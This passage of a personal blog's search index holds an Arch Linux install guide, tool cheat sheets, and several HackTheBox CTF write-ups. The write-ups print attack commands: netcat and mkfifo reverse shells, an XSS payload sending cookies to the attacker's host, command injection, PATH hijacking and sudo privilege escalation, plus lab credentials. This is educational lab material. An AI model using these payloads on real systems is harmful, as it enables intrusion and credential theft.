","date":"2021-08-18","objectID":"/install-archlinux/:3:1","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Basic configuration You want now to set your NTP: timedatectl set-timezone Europe/Paris # change to your location timedatectl set-ntp true ","date":"2021-08-18","objectID":"/install-archlinux/:3:2","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Linux setup Basic install We will now mount our partitions on the system and install basic packages on it. mount /dev/sdX3 /mnt mkdir /mnt/home; mount /dev/sdX4 /mnt/home mkdir /mnt/boot; mount /dev/sdX2 /mnt/boot mkdir /mnt/boot/efi; mount /dev/sdX1 /mnt/boot/efi Reffer to the partitions table Let‚Äôs install basic packages using pacstrap: pacstrap /mnt base base-devel linux linux-firmware If your ISO is old, you will have to update your keyring because some PGP signatures could be missing/expired. You will want to add nvidia if you have such card. Or even your favourite text editor. We can now generate our fstab: genfstab -U /mnt \u003e\u003e /mnt/etc/fstab ‚ö†Ô∏è Do not forget to install dhclient if you want Internet access after reboot Configuration We can now edit our configuration: vi /etc/hostname # My-Super-Machine vi /etc/hosts # 127.0.0.1 My-Super-Machine.my-local-domain My-Super-Machine # NTP setup ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc Set your locales: vi /etc/locale.gen # uncomment your locale locale-gen vi /etc/locale.conf # Use your own # LANG=\"en_US.UTF-8\" We can now set a password for the root account: passwd ","date":"2021-08-18","objectID":"/install-archlinux/:3:3","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Boot setup Let‚Äôs install Grub for the boot manager: pacman -S grub efibootmgr Setup the kernel modules and install Grub on the system: arch-chroot /mnt mkinitcpio -p linux grub-install --target=x86_64-efi --efi-directory=/boot/efi --recheck /dev/sdX grub-mkconfig -o /boot/grub/grub.cfg Your system is now ready to work. Congratulations, you can now reboot the machine and unplug the USB stick! ","date":"2021-08-18","objectID":"/install-archlinux/:3:4","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Sudoer user We do not want to use root user, we create a sudo user: useradd --create-home user_name passwd user_name usermod --append --groups wheel user_name visudo # uncomment %wheel ALL=(ALL) ALL Users in wheel group will be sudoer (using their password). ","date":"2021-08-18","objectID":"/install-archlinux/:3:5","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Graphical environment You may now need to use a graphical environment, I will show how to use the famous i3 and setup a basic status bar: polybar. Install xorg if not installed yet I will from now, exec commands as a regular user. sudo -u user_name. ","date":"2021-08-18","objectID":"/install-archlinux/:4:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"i3 sudo pacman -S i3-wm And voil√†, i3 is now installed. It will start on next login, we will see for a connection manager in a moment. ","date":"2021-08-18","objectID":"/install-archlinux/:4:1","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"polybar You want a status bar? Polybar provide fast, easy to customize bars. # not available on pacman repos, so build from source cd ~/.local/share git clone https://aur.archlinux.org/polybar cd polybar; makepkg -isc Once installed you can find cool themes at https://github.com/adi1090x/polybar-themes you will find installation and setup instructions on the repo. You can add an entry for the bar to launch on login in your i3 config: vim ~/.config/i3/config # exec_always --no-startup-id ~/.config/polybar/launch.sh --your-selected-theme ","date":"2021-08-18","objectID":"/install-archlinux/:4:2","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"rofi I use rofi for my application launcher and power menu, see https://github.com/adi1090x/rofi for more info. Add a system bind on your config: vim ~/.config/i3/config # bindsym $mod+d exec ~/.config/rofi/launchers/launcher_you_want/launcher.sh ","date":"2021-08-18","objectID":"/install-archlinux/:4:3","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"lightdm As its name says, lightdm is a lightweight package, it will allow you to setup your login page on startup. Don‚Äôt forget to enable it with sysytemd: systemctl enable lightdm. ","date":"2021-08-18","objectID":"/install-archlinux/:4:4","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Post-installation troubleshouting ","date":"2021-08-18","objectID":"/install-archlinux/:5:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"BIOS update broke my setup Yeah it appears that on a BIOS update, you can break your grub config. It happened to me every time as I run a dual boot alongside W*ndows. Jokes apart, it is very easy to fix things. The main issue encountered is the disapearance of Grub and so, your Arch partition. Fear not, you can fix it in only 2 steps: Find your bootable stick and boot on it Follow the steps: # mount your partitions mount /dev/sdX3 /mnt; mount /dev/sdX4 /mnt/home; mount /dev/sdX2 /mnt/boot; mount /dev/sdX1 /mnt/boot/efi # regenerate your fstab genfstab -U /mnt \u003e\u003e /mnt/etc/fstab # reinstall grub arch-chroot /mnt mkinitcpio -p linux grub-install --target=x86_64-efi --efi-directory=/boot/efi --recheck grub-mkconfig -o /boot/grub/grub.cfg And you can reboot. ","date":"2021-08-18","objectID":"/install-archlinux/:5:1","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Dual boot with windows My grub did not detect my Windows partition, this post helped me to solve the issue. ","date":"2021-08-18","objectID":"/install-archlinux/:5:2","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Tips Something is broken? You forgot to install an important package but already completed all the steps? Do not reinstall from scratch! Just boot on your USB, mount your system back and chroot into it! If using Nvidia card, set nomodeset on boot if screen tearing/glitch Make sure to have some space for the root partition, even 32GB is tight sometimes Update your pacman‚Äôs keyring if the ISO is old with pacman-key --populate archlinux Make sure to install dhclient and a network manager to access the Internet Disable the computer speaker BEEP: echo blacklist pcspkr \u003e /etc/modprobe.d/nobeep.conf If you find something broken here, feel free to send an issue on the Github repo. As I am in some distro reinstallation process, I will update this notes on the fly. ","date":"2021-08-18","objectID":"/install-archlinux/:6:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":["HTB"],"content":"TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection. ","date":"2021-08-11","objectID":"/htb-previse/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Previse","uri":"/htb-previse/"},{"categories":["HTB"],"content":"Footholds nmap gives us only ports 22 and 80. We first get this website: Nothing we can deal with here, no SQL injection :( For more info I used dirsearch to fuzz the web pages, and it found the following: /accounts.php /download.php /files.php /login.php /logout.php /logs.php /status.php ","date":"2021-08-11","objectID":"/htb-previse/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Previse","uri":"/htb-previse/"},{"categories":["HTB"],"content":"User All with 302 Found HTTP code, with a redirect towards /login.php. With that much info we want to get the content of those pages. To do so I used BurpSuite and made a filter to replace HTTP/1.1 302 Found with HTTP/1.1 200 which worked like a charm, but using only curl would also work. We now have access to the previous pages. In order to download a file you must have a valid PHPSESSID, so you want to create your own user on /accounts.php. Log in again with your fresh accounts and you can access to the siteBacku.zip file at /files.php. In this backup we have multiple files, including a nice config.php containing MySQL credentials; we will use it in a minute. We also have the code for the whole webapp. One file caught my attention: // logs.php [...] ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); echo $output; [...] Whatever this means, there is no filter at all for this $_POST['delim'] variable, therefor we can easily inject some command here. As confidant as always I open a netcat listener on my machine, and inject my payload like so: curl -X POST previse.htb/logs.php -b 'PHPSESSID=MY_VALID_SESSION' -d 'delim=;nc IP PORT -e /bin/sh' As expected I got my reverse shell üéâ Let‚Äôs upgrade from this poor virgin netcat to a chad upgrade: # on reverse shell python -c 'import pty; pty.spawn(\"/bin/bash\")' (www-data@previse.htb) /var/www/html/: ^Z # Ctrl-Z to background # on main host ~/ctf/htb/previse \u003e stty raw -echo; fg (www-data@previse.htb) /var/www/html/: We now have a better shell, with history and completion. Time to get user! With the previous info we can directly dump the database: mysql -u root -p 'mySQL_p@ssw0rd!:)' -D previse -e 'select * from accounts;' Like so we get a password hash for an another user: m4lwhere:$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf., we crack it using hashcat because john did not worked: hashcat -m 500 user_hash /usr/share/wordlist/rockyou.txt # wait for about 15 minutes... $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! We can SSH on the box. ","date":"2021-08-11","objectID":"/htb-previse/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Previse","uri":"/htb-previse/"},{"categories":["HTB"],"content":"Root (m4lwhere@previse.htb): sudo -l (root) /opt/scripts/access_backups.sh # /opt/scripts/access_backup.sh gzip -c /var/www/apache_logs.gz ... The path for the access_backup.sh is absolute, but not for gzip in the script. We can then create our own gzip executable which will run with root rights: # /tmp/gzip #!/bin/sh cat /root/root.txt \u003e /tmp/root We change our path with export PATH=\"/tmp/:$PATH\" and execute the script with sudo: cd /tmp; sudo /opt/scripts/access_logs.sh ","date":"2021-08-11","objectID":"/htb-previse/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Previse","uri":"/htb-previse/"},{"categories":["HTB"],"content":" Cool box, not too CTF-like and real-life applicable, my first FreeBSD üòÑ But root part was too quick. ","date":"2021-08-04","objectID":"/htb-schooled/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root. ","date":"2021-08-04","objectID":"/htb-schooled/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"Footholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap.out schooled.htb Nmap scan report for schooled.htb (10.10.10.234) Host is up (0.082s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\" | HY000 | oracle-tns: | Invalid message-frame.\" |_ HY000 ... The website we have seems to be static, no JavaScript to exploit, not so much to do ü§î After a while I read that they are talking about a Moodle on this site. So I decided to find it, moodle.schooled.htb! ","date":"2021-08-04","objectID":"/htb-schooled/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"Entrypoint ","date":"2021-08-04","objectID":"/htb-schooled/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"XSS you say? Found the version by visiting some forbidden page for my user: Moodle 3.9. We got those email domains: student.schooled.htb \u0026 staff.schooled.htb. Looking for exploits for this version, I found an XSS payload for MoodleNet in user profile. By chance, a teacher (maths class) is looking for enroled students‚Äô MoodleNet profiles. MoodleNet: \u003cscript\u003enew Image().src=\"http://your-ip:port/\" + document.cookie\u003c/script\u003e python3 -m http.server port See here for more details about the XSS. By starting an HTTP server on our machine, we get the teacher‚Äôs session cookie. ","date":"2021-08-04","objectID":"/htb-schooled/:3:1","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"Get manager access After some research on this Moodle version, I found a good exploit to use: https://github.com/lanzt/CVE-2020-14321. No need to fix this exploit, even if this is not the original exploit script for this CVE, I used it because it was the first to show in the search engine. python3 cve.py http://moodle.schooled.htb/moodle -c \"whoami\" --cookie TEACHER_COOKIE [...] www As this box was FreeBSD, nc does not work the same, we need a bigger payload for a reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc IP PORT \u003e/tmp/f So my command to get a reverse shell: python3 cve.py http://moodle.schooled.htb/moodle -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc IP PORT \u003e/tmp/f\" --cookie TEACHER_COOKIE On another terminal: nc -nlvp PORT $ whoami www $ We have now a reverse shell! Let‚Äôs get user. ","date":"2021-08-04","objectID":"/htb-schooled/:3:2","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"User List user directories: $ ls /home /home/steve /home/jamie By looking in the moodle‚Äôs directory we get this config file: \u003c?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u003edbtype = 'mysqli'; $CFG-\u003edblibrary = 'native'; $CFG-\u003edbhost = 'localhost'; $CFG-\u003edbname = 'moodle'; $CFG-\u003edbuser = 'moodle'; $CFG-\u003edbpass = 'PlaybookMaster2020'; $CFG-\u003eprefix = 'mdl_'; $CFG-\u003edboptions = array ( 'dbpersist' =\u003e 0, 'dbport' =\u003e 3306, 'dbsocket' =\u003e '', 'dbcollation' =\u003e 'utf8_unicode_ci', ); $CFG-\u003ewwwroot = 'http://moodle.schooled.htb/moodle'; $CFG-\u003edataroot = '/usr/local/www/apache24/moodledata'; $CFG-\u003eadmin = 'admin'; $CFG-\u003edirectorypermissions = 0777; require_once(__DIR__ . '/lib/setup.php'); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! We have now MySQL creds, let‚Äôs use them: /usr/local/bin/mysql -umoodle -p Password: Weird‚Ä¶ We should get a shell here. In fact the exploit we use is not meant to nest child shells. For example we can‚Äôt just bash to get a bash shell, we must stay in our shell. Fortunaletly we can execute commands using MySQL‚Äôs binary: /usr/local/bin/mysql -umoodle -pPlaybookMaster2020 -D moodle -e \"show tables;\" We dump the users: select * from mdl_user; The interesting line here is: admin $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW Jamie Borham jamie@staff.schooled.htb We need to crack this hash. Let‚Äôs use john: We can SSH with this. ","date":"2021-08-04","objectID":"/htb-schooled/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":"Root Classic: sudo -l (NOPASSWD) /usr/sbin/pkg update (NOPASSWD) /usr/sbin/pkg install * Using this https://gtfobins.github.io/gtfobins/pkg/ we build our package to RCE as root: # local echo 'cat /root/root.txt' \u003e a.sh fpm -n x -s dir -t freebsd -a all --before-install a.sh . scp x-1.0.txz jamie@schooled.htb:/tmp # ssh sudo /usr/sbin/pkg install -y --no-repo-update /tmp/x-1.0.txz ... /root/root.txt hash here ","date":"2021-08-04","objectID":"/htb-schooled/:5:0","tags":["htb","writeup"],"title":"üì¶ HTB - Schooled","uri":"/htb-schooled/"},{"categories":["HTB"],"content":" ‚ö†Ô∏è writeup wrote months after root so informations are not accurate. ","date":"2021-07-29","objectID":"/htb-bountyhunter/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - BountyHunter","uri":"/htb-bountyhunter/"},{"categories":["HTB"],"content":"TL;DR JS source code disclosure to forge internal requests, leak PHP source code with XXE in custom request, get DB credentials. Privesc with code injection in custom code without input validation. ","date":"2021-07-29","objectID":"/htb-bountyhunter/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - BountyHunter","uri":"/htb-bountyhunter/"},{"categories":["HTB"],"content":"Recon Only HTTP and SSH, nothing special. ","date":"2021-07-29","objectID":"/htb-bountyhunter/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - BountyHunter","uri":"/htb-bountyhunter/"},{"categories":["HTB"],"content":"Footholds We have here a simple web server, with custom SJ script to send bounty tickets. The portal tells us to go to /log_submit.php, here we have a custom XHR launched towards an internal API dirb_pr00f314.php. We see that XML is posted here so lets try a classic XXE: We can leak source code with this, here are the files I got: db.php. We get credentials: \u003c?php // TODO -\u003e Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ?\u003e With leaking /etc/passwd we got our target, the user developement. We can SSH eith the $dbpassword. ","date":"2021-07-29","objectID":"/htb-bountyhunter/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - BountyHunter","uri":"/htb-bountyhunter/"},{"categories":["HTB"],"content":"Privesc Basic sudo -l: From that we have a local script to validate tickets: ticketValidator.py. Here we see an obvious code injection vulnerability in a custom ticket: We cat get root: ","date":"2021-07-29","objectID":"/htb-bountyhunter/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - BountyHunter","uri":"/htb-bountyhunter/"},{"categories":["HTB"],"content":" Pretty interesting box, first time seeing Android in HTB. ","date":"2021-07-29","objectID":"/htb-explore/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - Explore","uri":"/htb-explore/"},{"categories":["HTB"],"content":"TL;DR Exfilter files on device using ES File explorer exploit, get user credentials. Root is straightforward with ADB. ","date":"2021-07-29","objectID":"/htb-explore/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Explore","uri":"/htb-explore/"},{"categories":["HTB"],"content":"Footholds With nmap we get the following: # Nmap 7.91 scan initiated Wed Jul 28 14:49:28 2021 as: nmap -A -p- -o nmap.out explore.htb Nmap scan report for explore.htb (10.10.10.247) Host is up (0.043s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 33195/tcp open unknown [...] 2222: SSH server 5555: not interesting, we will see why further 33195: ES File Explorer (with some research) The only useful port here is 33195, with a litle research on the web we get that this is possibly a good entrypoint for our exploit. ","date":"2021-07-29","objectID":"/htb-explore/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Explore","uri":"/htb-explore/"},{"categories":["HTB"],"content":"User As this is an easy box and I am lazy I used the forbidden M e t a s p l o i t. Using it‚Äôs auxiliary/scanner/es_file_explorer_open_port exploit I managed to exfilter some files off the device: We found some Pictures on the device. The creds.jpg is very interesting: We can now ssh to the device and get user.txt. ","date":"2021-07-29","objectID":"/htb-explore/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Explore","uri":"/htb-explore/"},{"categories":["HTB"],"content":"Root The idea that came to my mind here was to use ADB to get a root shell on the device. We first need to connect to this device with ADB, so we have to make a tunnel: ssh -p 2222 user@explore.htb -L 5555:localhost:5555 We can now connect to it: adb connect localhost:5555 adb root adb shell End of the box. ","date":"2021-07-29","objectID":"/htb-explore/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Explore","uri":"/htb-explore/"},{"categories":["HTB"],"content":" Simple easy box, perfect to warmup before the FIC 2021 and get more confidence in 1337 h4ck1n9 ","date":"2021-07-28","objectID":"/htb-cap/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"TL;DR Find PCAP file on server, get SSH credentials, execute code as root with Python. ","date":"2021-07-28","objectID":"/htb-cap/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"Footholds I did not even use nmap here, as we had a web server serving on port tcp:80. This website looked like this: It seems to be a security dashboard for a server, we don‚Äôt have any info about that. We have multiple endpoints on the server : /capture: redirects to /data/{id} after loading /data/{id}: we can download {id}.pcap by clicking a button /ip: get a netstat output What can we do with that? ","date":"2021-07-28","objectID":"/htb-cap/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"User I got to download the file 11.pcap, and got nothing in it. I recognized that all my interactions with the server were logged in this PCAP, which is odd, I tought the server was serving a particular PCAP. After playing again with the /capture endpoint, I figured out that the /data/{id} correspond to a specific user or IP. So I checked /data/0 and got the following data: And guess what? Yes we can see credentials in cleartext here: So we can SSH to the machine with those. ","date":"2021-07-28","objectID":"/htb-cap/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"Root ","date":"2021-07-28","objectID":"/htb-cap/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"Source code The server was running in /var/www/html/app.py which is a Flask server. the user nathan have rw rights on it so I checked the source code: import os from flask import * from flask_limiter import Limiter from flask_limiter.util import get_remote_address import tempfile import dpkt from werkzeug.utils import append_slash_redirect # [...] app = Flask(__name__) @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/capture\") @limiter.limit(\"10 per minute\") def capture(): path = os.path.join(app.root_path, \"upload\", str(pcapid) + \".pcap\") ip = request.remote_addr # permissions issues with gunicorn and threads. hacky solution for now. #os.setuid(0) #command = f\"timeout 5 tcpdump -w {path} -i any host {ip}\" command = f\"\"\"python3 -c 'import os; os.setuid(0); os.system(\"timeout 5 tcpdump -w {path} -i any host {ip}\")'\"\"\" os.system(command) #os.setuid(1000) return redirect(\"/data/\" + str(pcapid)) @app.route(\"/ip\") def ifconfig(): d = os.popen(\"ifconfig\").read().strip() print(d) return render_template(\"index.html\", rawtext=d) @app.route(\"/data/\u003cid\u003e\") def data_id(id): try: id = int(id) except: return redirect(\"/\") try: data = process_pcap(os.path.join(app.root_path, \"upload\", str(id) + \".pcap\")) path = str(id) + \".pcap\" return render_template(\"index.html\", data=data, path=path) except Exception as e: print(e) return redirect(\"/\") # [...] if __name__ == \"__main__\": app.run(\"0.0.0.0\", 80, debug=True) I removed some code for readability but you get the idea. The important stuff is the os.setuid(0) part. If you want the complete code, check it here. ","date":"2021-07-28","objectID":"/htb-cap/:4:1","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["HTB"],"content":"Exploit As you can expect here we can execute code as root with the os.setuid(0) line. So I just edited this app.py file and added one route: @app.route(\"/test\") def test(): os.setuid(0) data = os.popen(\"cat /root/root.txt\").read() return render_template(\"index.html\", data=data) # opened a new port on the machine if __name__ == \"__main__\": app.run(\"0.0.0.0\", 65000, debug=True) Then I started the server in the SSH connection: nathan@cap: python3 app.py, and connected on the server on my local machine with firefox http://cap.htb:65000/test. And voil√†. ","date":"2021-07-28","objectID":"/htb-cap/:4:2","tags":["htb","writeup"],"title":"üì¶ HTB - Cap","uri":"/htb-cap/"},{"categories":["TL;DR"],"content":"I use Arch btw ","date":"2021-05-04","objectID":"/tldr-pacman/:0:0","tags":["archlinux","pacman","tldr"],"title":"üöÄ TL;DR - pacman","uri":"/tldr-pacman/"},{"categories":["TL;DR"],"content":"pacman The famous packet manager for Archlinux. ","date":"2021-05-04","objectID":"/tldr-pacman/:1:0","tags":["archlinux","pacman","tldr"],"title":"üöÄ TL;DR - pacman","uri":"/tldr-pacman/"},{"categories":["TL;DR"],"content":"Basic usage pacman -S package # install package pacman -R package # uninstall package pacman -Syu # check for package updates pacman -Q # list installed packages pacman -Q word # list installed packages containing word ","date":"2021-05-04","objectID":"/tldr-pacman/:1:1","tags":["archlinux","pacman","tldr"],"title":"üöÄ TL;DR - pacman","uri":"/tldr-pacman/"},{"categories":["TL;DR"],"content":"Bonus Nothing to do with pacman, but you can install packages from the AUR repo too! cd ~/.local/share git clone aur_repo cd aur_repo makepkg -isc AUR packages are updated by the community and are meant to be built from source, in order to optimize the package for your machine. ","date":"2021-05-04","objectID":"/tldr-pacman/:1:2","tags":["archlinux","pacman","tldr"],"title":"üöÄ TL;DR - pacman","uri":"/tldr-pacman/"},{"categories":["TL;DR"],"content":"Resources https://archlinux.org/pacman/pacman.8.html https://wiki.archlinux.org/title/Pacman/Tips_and_tricks ","date":"2021-05-04","objectID":"/tldr-pacman/:1:3","tags":["archlinux","pacman","tldr"],"title":"üöÄ TL;DR - pacman","uri":"/tldr-pacman/"},{"categories":["TL;DR"],"content":"nmap Maybe the most used tool when it comes to network discovery and port knocking. ","date":"2021-05-04","objectID":"/tldr-nmap/:1:0","tags":["tldr","nmap"],"title":"üöÄ TL;DR - nmap","uri":"/tldr-nmap/"},{"categories":["TL;DR"],"content":"Network discovery nmap -sn 10.10.10.0/24 ","date":"2021-05-04","objectID":"/tldr-nmap/:1:1","tags":["tldr","nmap"],"title":"üöÄ TL;DR - nmap","uri":"/tldr-nmap/"},{"categories":["TL;DR"],"content":"Machine scan nmap 10.10.10.1 # classic soft scan nmap 10.10.10.1 -sU # UDP scan nmap 10.10.10.1 -p 80,443 # scan only ports 80 and 443 nmap 10.10.10.1 -p 1000-2000 # scan all ports between 1000 and 2000 nmap 10.10.10.1 -p- # scan all ports nmap 10.10.10.1 -sV # get services and versions running on open ports nmap 10.10.10.1 -sC # use default scripts when scanning nmap 10.10.10.1 -O # detect OS nmap 10.10.10.1 -A # equivalent to `nmap 10.10.10.1 -O -sV -sC --traceroute` ","date":"2021-05-04","objectID":"/tldr-nmap/:1:2","tags":["tldr","nmap"],"title":"üöÄ TL;DR - nmap","uri":"/tldr-nmap/"},{"categories":["TL;DR"],"content":"Global switches -o{N,X,S,G} output_file # save results in output_file in different formats -T{1..5} # use from 1 to 5 threads -6 # enable IPv6 -S ip # spoof given IP -e interface # use given interface ","date":"2021-05-04","objectID":"/tldr-nmap/:1:3","tags":["tldr","nmap"],"title":"üöÄ TL;DR - nmap","uri":"/tldr-nmap/"},{"categories":["TL;DR"],"content":"Resources https://nmap.org/book/man-briefoptions.html https://github.com/OxNinja/Network-Visualizer ","date":"2021-05-04","objectID":"/tldr-nmap/:1:4","tags":["tldr","nmap"],"title":"üöÄ TL;DR - nmap","uri":"/tldr-nmap/"},{"categories":["TL;DR"],"content":"Docker üêã Wow, you don‚Äôt know yet what is Docker? Well, let me introduce you this beautiful containerization tool. ","date":"2021-05-04","objectID":"/tldr-docker/:1:0","tags":["docker","tldr"],"title":"üöÄ TL;DR - Docker","uri":"/tldr-docker/"},{"categories":["TL;DR"],"content":"Containers? Container ~= virtual machine A container is like a virtual machine that runs in background on your computer. It simulates a whole system in the same way. Container \u003e virtual machnie But, a container is faster, better and stronger than a classical VM. Because it is meant to be fast and light-weight. ","date":"2021-05-04","objectID":"/tldr-docker/:1:1","tags":["docker","tldr"],"title":"üöÄ TL;DR - Docker","uri":"/tldr-docker/"},{"categories":["TL;DR"],"content":"Images Docker uses images to run containers. In short an image is a base container, which will be used by your container ‚Äì like said ‚Äì as a base. For example, I want to run an Ubuntu container, my Docker image will be something like: FROM ubuntu:latest RUN apt update This file is called a Dockerfile, because it produces the corresponding Docker container when built. When ran, this image will use the latest Ubuntu image in Docker‚Äôs database, amd update it. You can do so much in a Docker image! ","date":"2021-05-04","objectID":"/tldr-docker/:1:2","tags":["docker","tldr"],"title":"üöÄ TL;DR - Docker","uri":"/tldr-docker/"},{"categories":["TL;DR"],"content":"Build \u0026 run Once you made your Dockerfile, you will use it to build your Docker image: docker build -t my-image . -t my-image: the tag (or name if you want) to give to your image .: the directory where you put your Dockerfile You now want to run it! docker run my-image And, voila! Your container is running! ","date":"2021-05-04","objectID":"/tldr-docker/:1:3","tags":["docker","tldr"],"title":"üöÄ TL;DR - Docker","uri":"/tldr-docker/"},{"categories":["TL;DR"],"content":"Resources docker ps: list all running containers docker inspect: get information about a given container docker kill: kill a running container docker images: list all stored Docker images https://docs.docker.com/get-started/overview/ https://putaindecode.io/articles/introduction-a-docker/ https://docker-curriculum.com/ Setup your database with Docker ","date":"2021-05-04","objectID":"/tldr-docker/:1:4","tags":["docker","tldr"],"title":"üöÄ TL;DR - Docker","uri":"/tldr-docker/"},{"categories":["TL;DR"],"content":"So I came up with this basic concept: TL;DR. But what is it exactly? ","date":"2021-05-04","objectID":"/tldr-tldr/:0:0","tags":["storytelling","tldr"],"title":"üöÄ TL;DR - What is the 'TL;DR' series?","uri":"/tldr-tldr/"},{"categories":["TL;DR"],"content":"The TL;DR series The main idea is to share some knowledge in a quick and concise way, such as a RUMP but written on a file. It is like a writeup speedrunning-ish style of writting. And maybe because I am kind of lazy sometimes. The goal here is to write small articles about a subject I like, a new technique learnt, or anything that is not worth a full and detailed article. You will be able to get all TL;DR series with the tag tldr on every article I will publish in the future. Have fun reading! ","date":"2021-05-04","objectID":"/tldr-tldr/:1:0","tags":["storytelling","tldr"],"title":"üöÄ TL;DR - What is the 'TL;DR' series?","uri":"/tldr-tldr/"},{"categories":null,"content":"Recently I wanted to run a MySQL Docker container and encountered a tragical error: simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql' simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL 